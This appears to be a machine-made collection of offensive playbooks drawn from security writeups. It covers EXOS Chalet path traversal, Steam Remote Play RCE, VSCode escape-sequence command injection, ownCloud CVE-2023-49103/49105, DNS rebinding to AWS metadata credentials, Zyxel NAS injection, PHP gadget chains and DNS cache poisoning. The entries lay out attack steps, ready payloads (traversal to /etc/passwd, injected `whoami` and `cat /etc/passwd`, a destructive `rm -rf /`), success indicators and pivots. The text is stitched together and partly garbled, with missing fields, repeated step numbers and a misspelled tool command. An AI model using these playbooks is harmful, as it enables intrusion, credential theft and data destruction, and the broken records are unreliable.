Analysis of the `/terminal` endpoint revealing a `filename` parameter used for loading static files.
skip_if: The EXOS version is patched.
The Chalet web application is not exposed.

recon_steps: Step 1: Identify target devices running Extreme Networks EXOS using Shodan with relevant search terms (e.g., 'ExtremeNetworks EXOS', 'Chalet').
Step 2: Analyze the EXOS file system (if a VM is available) to locate the Chalet web application files.
Step 3: Decompile `.pyc` files using Uncompyle6 to obtain Python source code.
Step 4: Search for `@cherrypy.expose` decorators in the Python code to map application endpoints.
Step 5: Identify unauthenticated endpoints, focusing on the `/terminal` endpoint.
attack_steps: Step 1: (LFI) Send a GET request to the `/terminal/_static/` endpoint with a crafted `filename` parameter to read arbitrary files. Example: `GET /terminal/_static/?filename=../../../../etc/passwd`
Step 2: (LFI) If password hashes are found, attempt to crack them offline.
Step 3: (Privilege Escalation - CVE-2023-43120) If a read-only user account is compromised or accessible, exploit the arbitrary file write vulnerability to gain read-write admin privileges.

Step 4: (Arbitrary File Write - CVE-2023-43119) Send a POST request to an endpoint (details insufficient in writeup) with a read-only user to write arbitrary files as root. This could involve injecting malicious content into configuration files.

Step 5: (CSRF to RCE - CVE-2023-43118) Craft a CSRF payload targeting an authenticated user that leverages the arbitrary file write to achieve Remote Code Execution. This likely involves writing a script or configuration that gets executed by the system.

Step 6: (Unauthenticated File Read - CVE-2023-43121) Directly access the `/terminal/_static/` endpoint with a path traversal payload to read sensitive files like user password hashes from `/etc/shadow` or similar.
payloads_or_patterns: GET /terminal/_static/?filename=../../../../etc/passwd
GET /terminal/_static/?filename=../../../../config/config.xml
(For CVE-2023-43119 & CVE-2023-43118) POST request to an endpoint vulnerable to file write with crafted data to achieve RCE. Exact endpoint and data structure are unspecified in the writeup.
tools_recommended: Burp Suite: For intercepting, modifying, and replaying HTTP requests.
Uncompyle6: To decompile Python `.pyc` files.
Shodan: To discover internet-facing EXOS devices.
John the Ripper or Hashcat: To crack password hashes.
success_indicators: Response contains the content of sensitive files (e.g., `/etc/passwd`, EXOS configuration files with password hashes).
Successful cracking of user password hashes.
Ability to execute commands on the device after privilege escalation or RCE.
Receipt of a callback from a reverse shell after RCE.
failure_indicators: 404 Not Found for `/terminal` or `/_static` endpoints: Indicates the web interface is not running or the endpoint has changed.
403 Forbidden: May indicate WAF or access controls are preventing the request.
Empty or unexpected response: Suggests the path traversal is not working as expected, or the target file does not exist.
Permission denied when reading files: Even with path traversal, some files might be protected by stricter OS-level permissions.

playbooks.impact: Unauthenticated root file read allows disclosure of sensitive information including user password hashes and system configurations. Privilege escalation from a read-only user to a read-write admin. CSRF to RCE allows an attacker to execute arbitrary code on the device with root privileges. Arbitrary file write as root enables modification of system files, potentially leading to persistence, denial of service, or further compromise.
playbooks.key_lesson: Always analyze web application endpoints for path traversal vulnerabilities, especially when file names or paths are user-controlled. Ensure proper authentication and authorization checks are in place for all file system access operations.

meta.title: Achieving Remote Code Execution in Steam: a journey into the Remote Play protocol

trigger_conditions.when_to_apply: This playbook is applicable when the target Steam client is running the Remote Play feature and is configured to stream games. The attacker must be able to intercept or inject packets into the Remote Play communication channel.
prerequisites: Target user is running Steam with Remote Play enabled.
Attacker can communicate with the target over the network, potentially by being on the same local network or by exploiting network vulnerabilities to intercept traffic.
applicability_signals: Observing network traffic related to Steam Remote Play (ports 27031, 27036, 27037 are common).
The presence of Steam Remote Play client/server components on the target system.
skip_if: Remote Play feature is disabled on the target Steam client.
Strong network segmentation prevents attacker from reaching the target.

recon_steps: Step 1: Identify Steam client installations and observe network traffic on common Steam Remote Play ports (27031, 27036, 27037).
Step 2: Reverse engineer the Steam Remote Play protocol using tools like Wireshark and Ghidra to understand message formats and encryption.
attack_steps: Step 1: Develop a custom client or server capable of crafting and sending malformed messages according to the Reverse Engineered Remote Play protocol.
Step 2: Inject crafted messages into the communication channel between the Steam client and server.
Step 3: Analyze crash dumps or system behavior on the target Steam client to identify successful exploitation.
payloads_or_patterns: Crafted CRemoteHIDMsg packets with malformed gamepad logic data.
Crafted YV12 video frames with oversized or malformed data structures.
Specific payloads designed to trigger format string vulnerabilities (e.g., in CRemotePlayTogetherGroupUpdateMsg).
tools_recommended: Wireshark: To capture and analyze network traffic.
Ghidra/IDA Pro: For reverse engineering the Steam client and protocol implementations.
Custom Python scripts using libraries like `scapy` or custom protocol parsers for crafting and sending packets.
Fuzzing frameworks (e.g., custom fuzzer like rpfuzz mentioned in the writeup) to discover vulnerabilities.
success_indicators: Observed crashes in the Steam client process on the target machine.
Execution of arbitrary code, confirmed by reverse shells or other observable side effects.
Memory corruption detected via debugging tools or application instability.
failure_indicators: No crash or observable abnormal behavior on the target system.
Packets are rejected by the target with protocol errors or unexpected responses.
Payloads are sanitized or rejected by input validation. (Pivot: Try fuzzing other message types or parameters.)

playbooks.impact: Achieve Remote Code Execution on the victim's machine running the Steam client, allowing the attacker to take full control of the system.
playbooks.key_lesson: Thoroughly reverse engineer proprietary network protocols used by client applications, especially those that handle complex data streams like video or user input, as they often contain exploitable vulnerabilities.

meta.title: It's not a Feature, It's a Vulnerability

tech_stack_fingerprints: VSCode's shell integration feature relies on proprietary terminal escape sequences.

trigger_conditions.when_to_apply: When VSCode's shell integration feature is enabled and the user interacts with terminal output that contains crafted escape sequences, especially when the 'rerun' functionality is used.
prerequisites: VSCode must be installed and running.
The shell integration feature must be enabled in VSCode.
applicability_signals: Observe terminal output containing VSCode-specific escape sequences like OSC 633 (e.g., "\x1b]633;E;command\x07").
The ability to interact with terminal output and potentially re-run commands within VSCode.
skip_if: Shell integration feature is disabled.
VSCode version has been updated with the nonce-based mitigation.
The target environment does not allow for the execution of arbitrary commands.

recon_steps: Step 1: Confirm VSCode is in use and the shell integration feature is active (if possible through observable signs like specific terminal output formatting or documentation).
Step 2: Analyze terminal output for the presence of VSCode-specific escape sequences, particularly the OSC 633 sequence used for command extraction.
attack_steps: Step 1: Create a malicious response (e.g., via a local HTTP server or by crafting a file) that contains the escape sequence "\x1b]633;E;{COMMAND}\x07" where {COMMAND} is the desired OS command.
Step 2: Serve this malicious response to VSCode, for example, by using `curl` to fetch it into the VSCode terminal.
Step 3: If VSCode's shell integration parses the escape sequence and marks the command for execution, attempt to 'rerun' the command within VSCode, triggering the execution of the crafted OS command.
tools_recommended: curl: To fetch the malicious response into the VSCode terminal.
netcat (nc): To serve a crafted HTTP response containing the escape sequence.
Bash scripting: To construct the malicious payload and server response.
success_indicators: The specified OS command (e.g., `ping 127.0.0.1`) is executed on the host machine where VSCode is running.
Observable network activity or output from the executed command.
failure_indicators: The escape sequence is displayed literally in the terminal instead of being interpreted.
VSCode prompts for confirmation before executing the command (mitigated version).
A 403 error or other security measure prevents the command from executing.
Attempting to rerun the command results in no action or an error related to invalid command syntax.

playbooks.impact: Remote code execution (RCE) on the user's machine where VSCode is running, allowing the attacker to execute arbitrary commands with the privileges of the VSCode process.
playbooks.key_lesson: Beware of terminal emulator features that parse and execute special escape sequences, as they can be leveraged for command injection if not properly secured with authentication or sanitization.

meta.title: Owncloud: details about CVE-2023-49103 and CVE-2023-49105
meta.category: RCE, Privilege escalation, Authentication bypass, Information disclosure
meta.vuln_type: RCE | Privilege escalation | Authentication bypass | Information disclosure

trigger_conditions.when_to_apply: This exploit is applicable to ownCloud instances vulnerable to CVE-2023-49103 (information disclosure via PHPINFO) or CVE-2023-49105 (privilege escalation and RCE via signed URLs). The writeup specifically mentions testing on Dockerized ownCloud 10.12.2.
prerequisites: Target uses ownCloud version between 10.6.0 and 10.13.0 for CVE-2023-49105.
PHPINFO page is accessible for CVE-2023-49103.
applicability_signals: Reaching http://<TARGET_URL>/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/a.css returns a 200 OK status code.
WEBDAV or CALDAV endpoints are present and accept authentication via username and signature.
User accounts exist on the target instance (known usernames are sufficient).
skip_if: All responses from WEBDAV/CALDAV endpoints with forged signatures result in authentication errors (e.g., 401 Unauthorized or specific error messages indicating invalid signature).
PHPINFO page is not accessible or does not reveal environment variables.
ImageMagick is not used for preview generation or is updated to a patched version.

recon_steps: Step 1: Attempt to access the PHPINFO endpoint: GET http://<TARGET_URL>/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/a.css. Observe response for PHPINFO page content.
Step 2: If PHPINFO is accessible, parse the response for environment variables, particularly ownCloud administrator credentials.
Step 3: For CVE-2023-49105, identify target usernames. Attempt to access WEBDAV/CALDAV endpoints with a known username and a forged signature.
Step 4: Analyze responses from WEBDAV/CALDAV requests for any indication of authentication success or failure. Look for errors related to signature validation.
attack_steps: Step 1 (CVE-2023-49103 - Information Disclosure): Access http://<TARGET_URL>/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/a.css to retrieve environment variables, including administrator credentials.

Step 2 (CVE-2023-49105 - Unauthenticated RCE via ImageMagick): If ImageMagick is vulnerable, craft a malicious file (e.g., SVG with embedded ImageMagick commands) and upload it via WEBDAV using a forged signature for any user. Trigger preview generation to achieve RCE.

Step 3 (CVE-2023-49105 - Authenticated Privilege Escalation to Admin): Use a standard user's credentials and a forged signature to access endpoints that are not protected by the standard session validation. The writeup implies that the signed URL mechanism bypasses some checks, allowing `Session::setUser()` to be called with a user UID. Further analysis suggests this might lead to escalating privileges if the application logic after `validateSession()` is vulnerable.

Step 4 (CVE-2023-49105 - Authenticated RCE): Once administrator privileges are obtained, it is implied that RCE can be achieved through other means within the administrator context, potentially by uploading malicious files or exploiting other features.
payloads_or_patterns: http://<TARGET_URL>/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/a.css
Referer header: http://<TARGET_URL>/index.php/<USERNAME>/dav/files/<TARGET_FILE_NAME>
Username: <TARGET_USERNAME>
Signature: (Generated based on request elements and user-specific key, blank by default for unauthenticated users)
Malicious ImageMagick commands embedded in uploaded files (for RCE)
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially for forging signatures and fuzzing parameters.
Custom scripts: To automate the generation of signatures and brute-force usernames.
Curl: For crafting and sending specific HTTP requests.
success_indicators: Receiving PHPINFO page content containing environment variables with administrator credentials (for CVE-2023-49103).
Successful file upload and subsequent remote code execution through ImageMagick processing (for CVE-2023-49105 RCE).
Ability to access administrator-only functionalities or settings after authenticating as a standard user using a signed URL (for CVE-2023-49105 privilege escalation).
Successful modification or deletion of files belonging to other users via WEBDAV (for CVE-2023-49105).
failure_indicators: 401 Unauthorized or specific 'Invalid url signature' errors for WEBDAV/CALDAV requests indicate incorrect signature generation or a WAF blocking the attempt. Pivot to trying different signature generation methods or fuzzing username enumeration.
404 Not Found for the PHPINFO path suggests the specific vulnerable component is not present.
Attempts to escalate privileges fail, returning standard user responses, suggesting the signed URL mechanism does not bypass necessary checks in the specific version or configuration.

playbooks.impact: For CVE-2023-49103, an attacker can obtain the ownCloud administrator credentials, leading to full control over the instance. For CVE-2023-49105, unauthenticated attackers can gain CRUD access to any user's files and potentially achieve RCE. Authenticated standard users can escalate to administrator privileges and achieve RCE.
playbooks.key_lesson: When authentication relies on request signing, always check if the signature generation has default weak values (like empty keys) or if certain endpoints bypass standard session validation when using signed URLs. Furthermore, inspect accessible PHPINFO endpoints for sensitive environment variables.

meta.title: We Hacked Ourselves With DNS Rebinding

target_profile.technology: AWS EC2 Instances with Screenshot Workers
tech_stack_fingerprints: Internal HTTP services accessible from EC2 instances (e.g., 169.254.169.254)

trigger_conditions.when_to_apply: This technique is applicable when a system component (like a screenshot worker) fetches content from an external web server and processes it, especially if it follows HTTP redirects and can access internal network resources or metadata services.
prerequisites: Target system has a component that fetches external web content (e.g., for rendering, screenshotting).
The fetching component follows HTTP redirects.
The fetching component can access internal network resources or metadata services.
The internal resource does not properly validate the 'Host' header.
The internal resource uses HTTP, not HTTPS.
applicability_signals: Observable behavior of a component fetching external URLs.
Confirmation that HTTP redirects are followed by the component.
Detection of the component's ability to reach internal IP addresses like 169.254.169.254.
The target system is hosted on AWS EC2, indicating potential access to the metadata service.
skip_if: The fetching component explicitly blocks requests to private IP ranges.
The fetching component does not follow HTTP redirects.
The internal service is protected by HTTPS.
The internal service strictly validates the 'Host' header.

recon_steps: Step 1: Identify components within the target infrastructure that fetch and process external web content, particularly those used for previewing or rendering user-submitted URLs.
Step 2: Confirm if these components follow HTTP redirects.
Step 3: Test if these components can access internal IP addresses (e.g., 169.254.169.254 on AWS EC2) by submitting URLs pointing to these IPs (e.g., http://169.254.169.254/).
attack_steps: Step 1: Set up a public web server that initially serves content from a benign domain.
Step 2: Configure the public web server to redirect to an internal target (e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/ if targeting AWS EC2 metadata).
Step 3: Submit the benign domain URL to the target application's vulnerable component (e.g., the screenshot worker).
Step 4: Monitor the responses or side-effects triggered by the target's interaction with the redirected internal resource.
payloads_or_patterns: Initial URL: http://<your_public_server_domain>/
Redirected URL (example for AWS EC2): http://169.254.169.254/latest/meta-data/iam/security-credentials/
tools_recommended: Publicly accessible web server (e.g., ngrok, a VPS) for hosting the initial payload and redirection.
DNS server for controlling DNS records and enabling rebinding.
success_indicators: The target component's response or output (e.g., a screenshot) contains sensitive information from the internal resource, such as AWS credentials.
Observable network traffic or callbacks to attacker-controlled infrastructure originating from the target component.
failure_indicators: The target component fails to redirect or accesses a generic error page instead of internal data.
The output does not contain any sensitive information.
Error messages indicating connection failures or unauthorized access to internal resources.
If using DNS rebinding, verify the DNS server is correctly configured to switch IP addresses at the opportune moment.

playbooks.impact: The attacker can potentially retrieve sensitive information from internal systems, such as AWS EC2 instance metadata credentials, API keys, or internal configuration data, leading to privilege escalation or further compromise of internal resources.
playbooks.key_lesson: When a component fetches external URLs, always consider DNS rebinding as a technique to pivot from the public internet to internal network resources, especially if HTTP redirects are followed and the target does not validate the Host header or uses HTTP.

meta.title: CVE-2023-37927 & CVE-2023-37928 - Multiple post-auth blind OS command and Python code injection vulnerabilities in Zyxel’s NAS326 devices

trigger_conditions.when_to_apply: When an attacker has gained authenticated access to the Zyxel NAS device's administrative interface and can interact with features that process user-supplied input without proper sanitization.
prerequisites: Authenticated access to the Zyxel NAS administration portal.
applicability_signals: Presence of functionalities within the authenticated interface that accept user-controlled input (e.g., configuration settings, file upload parameters, API calls).
skip_if: All input fields are strictly validated and do not allow injection of shell metacharacters or Python code.
Firmware is updated to a version where CVE-2023-37927 and CVE-2023-37928 have been addressed.

recon_steps: Step 1: Gain authenticated access to the Zyxel NAS device's web administration interface.
Step 2: Explore the administrative interface to identify features that accept user-supplied input, particularly those related to system commands, file operations, or script execution.
attack_steps: Step 1: Identify an input field or parameter within the authenticated interface that is suspected to be vulnerable to command injection.
Step 2: Attempt to inject OS commands by appending shell metacharacters (e.g., `;`, `|`, `&`, `&&`) followed by a command (e.g., `ls`, `whoami`, `pwd`) to the input.
Step 3: If command injection is successful, attempt to execute Python code by using Python's `exec()` function or similar mechanisms through shell interpretation.
Step 4: Analyze responses and side effects for signs of command execution or code interpretation.
payloads_or_patterns: `<INPUT_FIELD_VALUE>; <OS_COMMAND>`, e.g., `test; whoami`
`<INPUT_FIELD_VALUE> | <OS_COMMAND>`, e.g., `test | ls -l`
`<INPUT_FIELD_VALUE> && <OS_COMMAND>`, e.g., `test && pwd`
`python -c 'import os; os.system("echo injected")'`, e.g., `test; python -c 'import os; os.system("cat /etc/passwd")'`
tools_recommended: Burp Suite (Repeater/Intruder for manual testing and fuzzing)
A command-line interface for interacting with the target if direct shell access is achieved.
success_indicators: Response contains output from the injected OS command (e.g., file listings, user information).
Error messages or behavior indicating successful execution of Python code.
Achieving arbitrary command execution on the target device.
Achieving arbitrary Python code execution on the target device.
failure_indicators: Input is sanitized, and special characters are escaped or removed.
Commands or code are not executed, and the application behaves as if normal input was provided.
A 4xx or 5xx error is returned without any indication of command execution.
Consider trying alternative injection techniques or looking for other vulnerable parameters if a specific injection point fails.

playbooks.impact: Full compromise of the Zyxel NAS device, allowing arbitrary OS command execution and Python code injection. This can lead to data theft, device manipulation, use as a pivot point for further network attacks, or persistent malware installation.
playbooks.key_lesson: Always perform thorough post-authentication security testing on embedded devices, as authenticated attack paths can lead to critical vulnerabilities like OS command and code injection, even if the initial login is secured.

meta.title: CVE-2023-4473 & CVE-2023-4474 - Authentication bypass and multiple blind OS command injection vulnerabilities in Zyxel’s NAS326 devices

trigger_conditions.when_to_apply: When an attacker can interact with the login or authentication interface of a Zyxel NAS device.
prerequisites: The target device must be a Zyxel NAS device running vulnerable firmware versions.
applicability_signals: Presence of a login page for Zyxel NAS devices.
skip_if: The device is running a patched firmware version.
All authentication attempts with invalid credentials result in predictable, non-vulnerable responses.

recon_steps: Step 1: Identify Zyxel NAS devices on the network. (e.g., via network scanning, Shodan)
Step 2: Fingerprint the firmware version if possible. (e.g., by observing HTTP response headers or specific file paths)
attack_steps: Step 1: Send an HTTP request to the Zyxel NAS login endpoint.
Step 2: Manipulate authentication parameters (e.g., username, password) in a way that bypasses normal credential validation.
Step 3: Observe the response to determine if unauthorized access is granted.
payloads_or_patterns: Insufficient detail in writeup. The writeup mentions authentication bypass but does not provide specific payloads or parameter manipulations.
tools_recommended: Burp Suite: To intercept and modify HTTP requests to the login endpoint.
Nmap: For network scanning and device discovery.
success_indicators: Gaining access to the device's administrative interface or authenticated endpoints without valid credentials.
Receiving a successful login response (e.g., HTTP 200 OK) without providing correct credentials.
failure_indicators: Receiving an error response (e.g., HTTP 401 Unauthorized, HTTP 403 Forbidden) consistently for all bypass attempts. Suggestion: If authentication bypass fails, pivot to testing for command injection vulnerabilities separately.

playbooks.impact: Unauthorized access to the Zyxel NAS device, potentially leading to data theft, device compromise, and further network intrusion.
playbooks.key_lesson: Thoroughly test authentication mechanisms in embedded firmware for bypass vulnerabilities by crafting unexpected input combinations for login credentials.

meta.title: Securing our home labs: Home Assistant code review

applicability_signals: Insufficient detail in writeup
skip_if: Insufficient detail in writeup

Step 2: Analyze the code for areas handling user-supplied input, configuration files, and data deserialization.

Step 2: Examine endpoints or functions that execute external commands or scripts based on user input. Look for command injection vulnerabilities.
Step 3: Review authentication and authorization mechanisms for weaknesses, particularly around API endpoints or administrative interfaces.
Step 4: Investigate file handling operations for potential local file inclusion (LFI) or path traversal vulnerabilities.
payloads_or_patterns: Example of a potential insecure deserialization payload (depends on specific library/implementation): `python -c 'import pickle; print(pickle.dumps(ExploitObject()))'`
Example of a command injection payload: `&; /bin/bash -c 'rm -rf /'`
Example of a path traversal payload: `../../../../etc/passwd`
tools_recommended: Static analysis tools (e.g., Semgrep, SonarQube) for automated code scanning.
Manual code review with an IDE and relevant plugins.
Dynamic analysis tools (e.g., Burp Suite) for testing identified vulnerabilities.

Unauthorized access to sensitive files or system commands.

meta.title: Gadgets chain in Laravel

prerequisites: Attacker can influence serialized data that is later deserialized by the application.
applicability_signals: insufficient detail in writeup
skip_if: Application validates all deserialized data or does not deserialize untrusted input.

recon_steps: Step 1: Identify endpoints or functionalities that handle serialized data.
attack_steps: Step 1: Craft a malicious serialized payload using known Laravel gadget chains (e.g., using tools like PHPGGC).
Step 2: Submit the crafted payload to the identified endpoint that processes serialized data.
Step 3: Observe for signs of Remote Code Execution (RCE).
payloads_or_patterns: Example payload structure using PHPGGC for Laravel: `php ggcs.php laravel/rce <command>`
tools_recommended: PHPGGC for generating gadget chains and payloads.
success_indicators: Execution of the specified command on the server (e.g., returning server version, listing files, reverse shell established).
failure_indicators: Application errors (e.g., 500 Internal Server Error) without command execution, or specific deserialization errors indicating payload rejection. Pivot: If direct RCE fails, investigate for other deserialization vulnerabilities like information disclosure.

playbooks.key_lesson: When dealing with web applications, always investigate deserialization points for potential gadget chains that can lead to RCE, especially in frameworks like Laravel.

meta.title: TRAP; RESET; POISON; - Taking over a country Kaminsky style

trigger_conditions.when_to_apply: When a recursive DNS resolver has low entropy in its query responses, such as those not properly implementing post-Kaminsky attack mitigation techniques.
prerequisites: Attacker can observe DNS queries made by the target resolver.
Attacker can influence or observe network traffic between the target resolver and authoritative DNS servers.
applicability_signals: Target resolver is observed making recursive DNS queries.
Network path allows for manipulation of DNS responses (e.g., attacker is on the same network or can intercept traffic).
skip_if: Target resolver implements strong DNS response entropy mechanisms (e.g., 32-bit randomness for query ID and source port).
Network path is heavily secured and does not allow for traffic interception or manipulation.

recon_steps: Step 1: Identify a target recursive DNS resolver that is observable and potentially vulnerable.
Step 2: Monitor DNS queries originating from the target resolver to identify patterns and un-cached records.
Step 3: Analyze the network path between the target resolver and authoritative DNS servers to identify potential manipulation points.
attack_steps: Step 1: Trigger a DNS query for a specific domain name from a client that uses the target recursive DNS resolver.
Step 2: Intercept or observe the DNS query made by the target resolver to the authoritative DNS server.
Step 3: Craft a spoofed DNS response with a malicious IP address for the queried domain.
Step 4: Attempt to send the spoofed DNS response to the target resolver with the correct DNS ID and source port, potentially leveraging IP fragmentation if applicable.
Step 5: Repeat steps 1-4 rapidly, aiming to send the spoofed response before the legitimate response arrives, to poison the resolver's cache.
Step 6: Confirm successful poisoning by performing a DNS lookup for the poisoned domain through the target resolver and verifying it resolves to the attacker-controlled IP address.
payloads_or_patterns: Spoofed DNS response containing A record pointing to attacker-controlled IP: <ATTACKER_IP>
tools_recommended: Scapy: For crafting and sending custom DNS packets, including spoofed responses and IP fragmentation.
Wireshark: For observing DNS traffic and analyzing query/response patterns.
DNSQuerySpoofer (or similar custom script): To automate the process of sending spoofed DNS responses.
success_indicators: DNS lookup for a domain through the compromised resolver returns an IP address controlled by the attacker.
Subsequent DNS queries from clients using the resolver for the poisoned domain are consistently resolved to the malicious IP.
failure_indicators: Spoofed DNS responses are consistently rejected by the resolver (e.g., due to incorrect DNS ID or source port).
Legitimate DNS responses arrive at the resolver before the spoofed ones.
Network restrictions prevent the attacker from sending spoofed packets or observing traffic.

playbooks.impact: The attacker can redirect all network traffic for a poisoned domain name to an IP address of their choosing. This can lead to man-in-the-middle attacks, phishing, credential theft, denial of service, or the compromise of entire infrastructures relying on the affected DNS resolver.
playbooks.key_lesson: When analyzing DNS infrastructure, prioritize identifying and testing recursive resolvers for vulnerabilities to DNS cache poisoning, especially those that may not fully implement post-Kaminsky attack mitigation techniques. Focus on low-entropy query responses and network paths that allow for response manipulation.

meta.title: Gadgets chain in WordPress

Step 3: Identify available gadget chains for the identified PHP versions and libraries.

Step 2: Send the crafted payload to the vulnerable deserialization endpoint/function. This often involves POSTing data to a specific endpoint or parameter.
Step 3: Monitor for signs of code execution on the target server.

tools_recommended: PHPGGC: To generate serialized PHP object payloads using known gadget chains.
Burp Suite: To intercept and modify requests, and to identify deserialization points.
